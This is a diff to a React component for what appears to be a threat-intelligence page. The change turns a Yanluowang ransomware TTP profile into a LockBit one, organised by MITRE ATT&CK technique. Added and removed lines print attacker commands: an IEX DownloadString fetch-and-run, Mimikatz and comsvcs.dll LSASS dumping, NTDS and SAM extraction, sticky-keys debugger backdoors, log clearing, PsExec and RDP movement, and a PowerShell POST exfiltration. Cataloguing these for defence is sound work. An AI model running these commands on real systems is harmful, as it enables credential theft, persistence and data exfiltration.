 					<div className='mb-5'>
 						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
 						<span>&nbsp;&nbsp;</span>
 						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
+						<span>&nbsp;&nbsp;</span>
+					
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
 						<span>&nbsp;&nbsp;</span>
 					
 						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;C:\Windows\system32\net user z Lh199211* /add</div>
-							<div>&deg;&nbsp;C:\Windows\system32\net localgroup administrators z /add</div>
+							<div>&deg;&nbsp;New-LocalUser -Name "#username" -NoPassword</div>
 							
 						</div>
 					</div>
+					
+				</div>
+			</div>
+		</div>
+		<div className='col-xl-6'>
+			<div className='card card-xl-stretch mb-xl-8'>
+				<div className='card-header align-items-center border-0 mt-4'>
+					<div className='symbol symbol-50px pb-1'>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1133 </span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- External Remote Services</span>
+					</div>
+				</div>
+				<div className='card-body pt-3'>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Observed multiple attempts to download and execute PowerShell (such as the above backdoor) on compromised devices from temporary servers hosted by the attacker, as shown in the below example</div>
+					
+					<div className='fs-2 fw-bold pb-3'>Command</div>
+					<div className='mb-5'>
+						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
+						<span>&nbsp;&nbsp;</span>
+						
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
+						<span>&nbsp;&nbsp;</span>
+					
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
+						<span>&nbsp;&nbsp;</span>
+					
+						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
+							<div>&deg;&nbsp;IEX(New-Object Net.WebClient).DownloadString('$addr'')</div>
+							
+						</div>
+					</div>
+					
+				</div>
+			</div>
+		</div>
+	</div>
+	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Privilege-Escalation</div>
+	<div className='row g-5 g-xl-8 pt-4'>
+		<div className='col-xl-6'>
+			<div className='card card-xl-stretch mb-xl-8'>
+				<div className='card-header align-items-center border-0 mt-4'>
+					<div className='symbol symbol-50px pb-1'>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1078</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Valid Accounts</span>
+					</div>
+				</div>
+				<div className='card-body pt-3'>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Before the encryption attack, the threat actor was able to reset the password of a service account on the compromised device, which also happened to be a domain administrative account. Attacker was then able to compromise additional accounts that had a logon presence on the initial foothold server.</div>
+					
+					
 					
 				</div>
 			</div>
@@ -519,12 +656,12 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1070.001</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Indicator Removal on Host: Clear Windows Event Logs</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1070.004</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Indicator Removal: File Deletion</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>They also used the “wevtutil.exe” utility to identify and clear event logs generated on the system.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Indicator removal via file deletion.</div>
 					
 					<div className='fs-2 fw-bold pb-3'>Command</div>
 					<div className='mb-5'>
@@ -535,65 +672,7 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 						<span>&nbsp;&nbsp;</span>
 					
 						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;wevtutil.exe el</div>
-							<div>&deg;&nbsp;wevtutil.exe cl [LOGNAME]</div>
-							
-						</div>
-					</div>
-					
-				</div>
-			</div>
-		</div>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1562.004</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Impair Defenses: Disable or Modify System Firewall</span>
-					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>To move files between systems within the environment, the threat actor often leveraged Remote Desktop Protocol (RDP) and Citrix. We observed them modifying the host-based firewall configurations to enable RDP access to systems.</div>
-					
-					<div className='fs-2 fw-bold pb-3'>Command</div>
-					<div className='mb-5'>
-						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
-						<span>&nbsp;&nbsp;</span>
-						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
-						<span>&nbsp;&nbsp;</span>
-					
-						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;netsh advfirewall firewall set rule group=remote desktop new enable=Yes</div>
-							
-						</div>
-					</div>
-					
-				</div>
-			</div>
-		</div>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1112</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Modify Registry</span>
-					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The attacker frequently leveraged Windows logon bypass techniques to maintain the ability to access systems in the environment with elevated privileges. They frequently relied upon PSEXESVC.exe to remotely add the following Registry key values.</div>
-					
-					<div className='fs-2 fw-bold pb-3'>Command</div>
-					<div className='mb-5'>
-						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
-						<span>&nbsp;&nbsp;</span>
-						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
-						<span>&nbsp;&nbsp;</span>
-					
-						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f</div>
-							<div>&deg;&nbsp;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f</div>
+							<div>&deg;&nbsp;del /f #file_to_delete</div>
 							
 						</div>
 					</div>
@@ -609,11 +688,11 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
 						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1003.001</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- OS Credential Dumping: LSASS Memory</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- OS credential dumping: LSASS Memory</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>On some systems, the attacker was observed employing MiniDump from Mimikatz to dump LSASS.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Mimikatz/abuse of password reset to gain access to domain admin account.</div>
 					
 					<div className='fs-2 fw-bold pb-3'>Command</div>
 					<div className='mb-5'>
@@ -624,8 +703,7 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 						<span>&nbsp;&nbsp;</span>
 					
 						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;tasklist | findstr lsass</div>
-							<div>&deg;&nbsp;rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [LSASS_PID] C:\windows\temp\lsass.dmp full</div>
+							<div>&deg;&nbsp;#mimikatz_exe "sekurlsa::minidump #input_file" "sekurlsa::logonpasswords full" exit</div>
 							
 						</div>
 					</div>
@@ -633,32 +711,50 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 				</div>
 			</div>
 		</div>
+	</div>
+	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Discovery</div>
+	<div className='row g-5 g-xl-8 pt-4'>
 		<div className='col-xl-6'>
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1003.002</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- OS Credential Dumping: Security Account Manager</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1046</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Network Service Discovery</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>An attempt was made to extract registry information, including the SAM database of a corrupted Windows endpoint.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Advanced Port Scanner software installed on compromised devices through a review of file-system evidence and the USN journal</div>
 					
+					<div className='fs-2 fw-bold pb-3'>Command</div>
+					<div className='mb-5'>
+						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
+						<span>&nbsp;&nbsp;</span>
+						
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
+						<span>&nbsp;&nbsp;</span>
 					
+						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
+							<div>&deg;&nbsp;for port in 1..65535; do (2/dev/null echo /dev/tcp/#host/$port) && echo port $port is open ; done</div>
+							
+						</div>
+					</div>
 					
 				</div>
 			</div>
 		</div>
+	</div>
+	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Lateral-Movement</div>
+	<div className='row g-5 g-xl-8 pt-4'>
 		<div className='col-xl-6'>
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1003.003</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- OS Credential Dumping: NTDS</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1021.001</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Remote Desktop Protocol</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>After obtaining access to the domain controllers, the attacker began attempting to dump NTDS from them using “ntdsutil.exe” consistent with the following syntax.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>RDP was used for moving throughout the environment</div>
 					
 					<div className='fs-2 fw-bold pb-3'>Command</div>
 					<div className='mb-5'>
@@ -672,7 +768,8 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 						<span>&nbsp;&nbsp;</span>
 					
 						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\users\public' q q </div>
+							<div>&deg;&nbsp;cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password</div>
+							<div>&deg;&nbsp;mstsc /v:$Server</div>
 							
 						</div>
 					</div>
@@ -684,31 +781,12 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1621</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Multi-Factor Authentication Request Generation</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1021.002</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Remote Services: SMB/Windows Admin Shares</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The user has registered a series of new devices for MFA and successfully authenticated to Cisco VPN.</div>
-					
-					
-					
-				</div>
-			</div>
-		</div>
-	</div>
-	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Discovery</div>
-	<div className='row g-5 g-xl-8 pt-4'>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1012</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Query Registry</span>
-					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The threat actor was observed attempting to extract registry information, including the SAM database on compromised windows hosts.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>PSExec was used for moving throughout the environment.</div>
 					
 					<div className='fs-2 fw-bold pb-3'>Command</div>
 					<div className='mb-5'>
@@ -719,9 +797,7 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 						<span>&nbsp;&nbsp;</span>
 					
 						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;reg save hklm\system system</div>
-							<div>&deg;&nbsp;reg save hklm\sam sam</div>
-							<div>&deg;&nbsp;reg save HKLM\security sec </div>
+							<div>&deg;&nbsp;#psexec_exe #remote_host -accepteula -c #command_path</div>
 							
 						</div>
 					</div>
@@ -729,16 +805,19 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 				</div>
 			</div>
 		</div>
+	</div>
+	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Collection</div>
+	<div className='row g-5 g-xl-8 pt-4'>
 		<div className='col-xl-6'>
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1083</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- File and Directory Discovery</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1560</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Archive Collected Data</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>As soon as the system penetrated, the attacker used the built-in Windows utility to identify the user and group membership configuration, host name, and user account context on that system and to begin enumerating the Active Directory (AD) environment.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Staged into ZIPs on compromised host prior to exfiltration.</div>
 					
 					
 					
@@ -752,46 +831,29 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1071.001</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Application Layer Protocol: Web Protocols</span>
-					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The malware also communicates with the C2 server via HTTP GET requests that feature the following structure.</div>
-					
-					
-					
-				</div>
-			</div>
-		</div>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
 						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1219</span>
 						<span className='text-dark fw-bold mb-1 fs-3'>- Remote Access Software</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>They installed additional remote access tools, including TeamViewer, LogMeIn, Cobalt Strike, PowerSploit, Mimikatz, and Imppacket.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>TightVNC was used for C2 operations by the threat actor.</div>
 					
+					<div className='fs-2 fw-bold pb-3'>Command</div>
+					<div className='mb-5'>
+						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
+						<span>&nbsp;&nbsp;</span>
+						
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
+						<span>&nbsp;&nbsp;</span>
 					
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
+						<span>&nbsp;&nbsp;</span>
 					
-				</div>
-			</div>
-		</div>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1573.002</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Encrypted Channel: Asymmetric Cryptography</span>
+						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
+							<div>&deg;&nbsp;Start-Process #TightVNC_Viewer_Path</div>
+							
+						</div>
 					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Following the initial request from the infected system, the C2 server responds with a SHA256 hash. We observed additional requests made every 10 seconds.</div>
-					
-					
 					
 				</div>
 			</div>
@@ -803,14 +865,73 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1573</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Encrypted Channel</span>
+					</div>
+				</div>
+				<div className='card-body pt-3'>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Using encrypted channel to exfiltrate data</div>
+					
+					
+					
+				</div>
+			</div>
+		</div>
+		<div className='col-xl-6'>
+			<div className='card card-xl-stretch mb-xl-8'>
+				<div className='card-header align-items-center border-0 mt-4'>
+					<div className='symbol symbol-50px pb-1'>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1041</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Exfiltration Over C2 Channel</span>
+					</div>
+				</div>
+				<div className='card-body pt-3'>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Using encrypted channel to exfiltrate data</div>
+					
+					<div className='fs-2 fw-bold pb-3'>Command</div>
+					<div className='mb-5'>
+						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
+						<span>&nbsp;&nbsp;</span>
+						
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
+						<span>&nbsp;&nbsp;</span>
+					
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
+						<span>&nbsp;&nbsp;</span>
+					
+						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
+							<div>&deg;&nbsp;Invoke-WebRequest -Uri #destination_url -Method POST -Body #filecontent -DisableKeepAlive</div>
+							
+						</div>
+					</div>
+					
+				</div>
+			</div>
+		</div>
+		<div className='col-xl-6'>
+			<div className='card card-xl-stretch mb-xl-8'>
+				<div className='card-header align-items-center border-0 mt-4'>
+					<div className='symbol symbol-50px pb-1'>
 						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1048</span>
 						<span className='text-dark fw-bold mb-1 fs-3'>- Exfiltration Over Alternative Protocol</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>An attacker attempted to leak information from the target environment. The data leaked from this attack included content in the Box folder on the infected employee device and employee authentication data from Active Directory.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>SSL/SFTP usage to transmit data over the internet to ephemeral locations via FileZilla — it is also believed that data was transmitted over TightVNC/PowerShell sessions to some extent.</div>
 					
+					<div className='fs-2 fw-bold pb-3'>Command</div>
+					<div className='mb-5'>
+						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
+						<span>&nbsp;&nbsp;</span>
+						
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>sh</span>
+						<span>&nbsp;&nbsp;</span>
 					
+						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
+							<div>&deg;&nbsp;ssh #domain "(cd /etc && tar -zcvf - *)"  ./etc.tar.gz</div>
+							
+						</div>
+					</div>
 					
 				</div>
 			</div>
@@ -822,12 +943,12 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1486</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Data Encrypted for Impact</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1531</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Account Access Removal</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The Sosemanuk stream cipher is used to encrypt files, its key then encrypted using the RSA-1024 asymmetric algorithm. The RSA public key itself is embedded in the program but additionally encrypted with the RC4 stream cipher whose key is a string and also embedded in ransomware. Yanluowang divides files into big and small along a 3 GB threshold. Small files are encrypted completely from beginning to end, big files are encrypted in stripes- 5 megabytes after every 200 megabytes. After a file is encrypted, an RSA-encrypted Sosemanuk key is written to the end of it. The encrypted endfile block has a size of 1024 bytes.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The threat actor made a surgical strike against critical file shares, rather than encrypting all reachable servers, demonstrating the importance of securing network access to sensitive data as much as possible</div>
 					
 					<div className='fs-2 fw-bold pb-3'>Command</div>
 					<div className='mb-5'>
@@ -838,22 +959,37 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 						<span>&nbsp;&nbsp;</span>
 					
 						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;encrypt.exe [(-p,-path,--path)path]</div>
+							<div>&deg;&nbsp;net user #user_account #new_user_password /add</div>
+							<div>&deg;&nbsp;net.exe user #user_account #new_password</div>
 							
 						</div>
 					</div>
+					
+				</div>
+			</div>
+		</div>
+		<div className='col-xl-6'>
+			<div className='card card-xl-stretch mb-xl-8'>
+				<div className='card-header align-items-center border-0 mt-4'>
+					<div className='symbol symbol-50px pb-1'>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1486</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Data Encrypted for Impact</span>
+					</div>
+				</div>
+				<div className='card-body pt-3'>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>LockBit ransomware was deployed to encrypt portions of the environment</div>
+					
+					
 					<div className='fs-2 fw-bold pb-3'>Encryption algorithm</div>
 					<div className='ms-5 mb-5'>
-						<span className='badge badge-light-info fs-7 fw-bold my-2'>Sosemanuk</span>
+						<span className='badge badge-light-info fs-7 fw-bold my-2'>AES</span>
 						<span>&nbsp;&nbsp;</span>
 						<span className='badge badge-light-info fs-7 fw-bold my-2'>RSA</span>
-						<span>&nbsp;&nbsp;</span>
-						<span className='badge badge-light-info fs-7 fw-bold my-2'>RC4</span>
 						<span>&nbsp;&nbsp;</span>
 						
 					</div>
 					<div className='fs-2 fw-bold pb-3'>Added Extension</div>
-					<div className='fs-4 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>.yanluowang</div>
+					<div className='fs-4 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>.(random string)</div>
 						
 				</div>
 			</div>
@@ -863,4 +999,4 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
   )
 }
 
-export {Yanluowang}
+export {Lockbit}
